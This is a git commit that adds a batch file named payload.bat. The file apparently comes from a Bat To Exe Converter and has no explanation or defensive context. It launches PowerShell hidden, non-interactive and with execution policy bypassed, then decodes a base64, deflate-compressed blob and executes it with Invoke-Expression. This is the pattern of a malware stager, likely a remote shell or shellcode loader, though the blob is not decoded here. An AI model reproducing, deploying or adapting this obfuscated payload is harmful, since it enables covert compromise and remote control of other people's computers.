dbc2c07b83e0d13c896ef759a956b4e01145804d
arjunkulkarni0208 <52421926+arjunkulkarni0208@users.noreply.github.com>
2024-10-10 20:41:33 +0530

    Add files via upload

---
+++ payload.bat
@@ -0,0 +1,35 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSzk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdDWDJFGL+UcMIxpYRTimM2ivC7AS/PvH+++Uth1TUfo6GA==
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+if %PROCESSOR_ARCHITECTURE%==x86 (powershell.exe -NoP -NonI -W Hidden -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"zVZNb9s4EL3rVxCGgEi1JFC2E7gRDDRp1t1gt25Qu92D4IMijW1uaFIgqcRK1v+9o1j+kJMtgh4WCx0ok29mnmbeDG2nZEA+tKz4ivPrZS6VcVp3oATwbifIOG+5U5IXt5ylRJvE4AIrg+fkWpgbo8h3pkyR8AvOZerUew8eKZgwZFWvZb0+utEvx/moIDEwWeCSbeMUtd97j+wj128HseudKnrrgxVflgbi6dQeTW4mKhF6yczAC9/1+tHhVkynA7oKL6MdXkMqRXZs0tzdWdlCXqQpaD2wZwnXEE1U+WSPZXoHZjCCB//L7d+QGjICE2x2db068eHeRZYp9DJMloyX0/Nz/BZQCHiQ6s6LX1pPyhwQdjVXybJ5fqOkkankNeJblrtRTSj4KIVANs5JoYNcSh4IkwdSzU+8sNN1o/i7ZNl0Cx6DyJzDVB0DvkIK7B6amHWamHTxdJAXowpYR7YqxESahA9oNJTqtyRdOPa1yGBFmCCNivRoEPS6U/dpb7N7e9c5PWtv7NDnjCltJmwJA+cg11eVgHDTCd9T6oX40Ocn3h78wURWpcakrltl/jPjnG0KrJ34G+b+rDd19jFDSikix8+IaGwSZfwxB8iJr0mXbmqOBKq8/I+KXjN6Y9W36E3Zm3J/AdqV/hi3D8qlBudX5XDUbW9VhMVmxPnvpEB8spcg8eeAYiC+VGT3uS55skylDo3T94DXuNQGlsHLEhMnfuXsp0Ihr1k0BDM2OE2XrwOPlDNJc9ey9V4z4ftOEJ71gxBrEHbpiUf6tE9d8g+RhfFFwXlE7By/Lr5QKqnIbSb4tcDxLlJwWrc4V1se6bkIXCEQve/kkx85esRzatnlG/zFl8wgy3tQmIuKucSsdDvo06Nu+7SKVuKYrhyuLofWw4JxIA5G8Ln5uTEWrWLSblItPfuxfYoK+vd0D3ky1+htJAW4ZG3NUAqOzQYhcmEYF0ivemu3MQKSs1nFbuvuiNEnMNWFhCLE2w0vpeD3RGQcXLTyw+nasg3aoi78qnDEX8LyFtQVzJhghklsoZT4owRl2fqLiW6nRXyBv3SepECed4aFSCukJn6eaG0WqqgKhA16ft647Klnl8GfIOZm4dFVFxsAlx51rS3zr4Uw2ADBsyplPgZ1z1D8wedE6UXCqxLKvKwySCjWbXNNY1Otgm3aXdcjuyCoP7Otev0/oGpZe7Xp3aZiGsO47sr+WY/SevCs19YP\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();") else (%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"zVZNb9s4EL3rVxCGgEi1JFC2E7gRDDRp1t1gt25Qu92D4IMijW1uaFIgqcRK1v+9o1j+kJMtgh4WCx0ok29mnmbeDG2nZEA+tKz4ivPrZS6VcVp3oATwbifIOG+5U5IXt5ylRJvE4AIrg+fkWpgbo8h3pkyR8AvOZerUew8eKZgwZFWvZb0+utEvx/moIDEwWeCSbeMUtd97j+wj128HseudKnrrgxVflgbi6dQeTW4mKhF6yczAC9/1+tHhVkynA7oKL6MdXkMqRXZs0tzdWdlCXqQpaD2wZwnXEE1U+WSPZXoHZjCCB//L7d+QGjICE2x2db068eHeRZYp9DJMloyX0/Nz/BZQCHiQ6s6LX1pPyhwQdjVXybJ5fqOkkankNeJblrtRTSj4KIVANs5JoYNcSh4IkwdSzU+8sNN1o/i7ZNl0Cx6DyJzDVB0DvkIK7B6amHWamHTxdJAXowpYR7YqxESahA9oNJTqtyRdOPa1yGBFmCCNivRoEPS6U/dpb7N7e9c5PWtv7NDnjCltJmwJA+cg11eVgHDTCd9T6oX40Ocn3h78wURWpcakrltl/jPjnG0KrJ34G+b+rDd19jFDSikix8+IaGwSZfwxB8iJr0mXbmqOBKq8/I+KXjN6Y9W36E3Zm3J/AdqV/hi3D8qlBudX5XDUbW9VhMVmxPnvpEB8spcg8eeAYiC+VGT3uS55skylDo3T94DXuNQGlsHLEhMnfuXsp0Ihr1k0BDM2OE2XrwOPlDNJc9ey9V4z4ftOEJ71gxBrEHbpiUf6tE9d8g+RhfFFwXlE7By/Lr5QKqnIbSb4tcDxLlJwWrc4V1se6bkIXCEQve/kkx85esRzatnlG/zFl8wgy3tQmIuKucSsdDvo06Nu+7SKVuKYrhyuLofWw4JxIA5G8Ln5uTEWrWLSblItPfuxfYoK+vd0D3ky1+htJAW4ZG3NUAqOzQYhcmEYF0ivemu3MQKSs1nFbuvuiNEnMNWFhCLE2w0vpeD3RGQcXLTyw+nasg3aoi78qnDEX8LyFtQVzJhghklsoZT4owRl2fqLiW6nRXyBv3SepECed4aFSCukJn6eaG0WqqgKhA16ft647Klnl8GfIOZm4dFVFxsAlx51rS3zr4Uw2ADBsyplPgZ1z1D8wedE6UXCqxLKvKwySCjWbXNNY1Otgm3aXdcjuyCoP7Otev0/oGpZe7Xp3aZiGsO47sr+WY/SevCs19YP\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();")
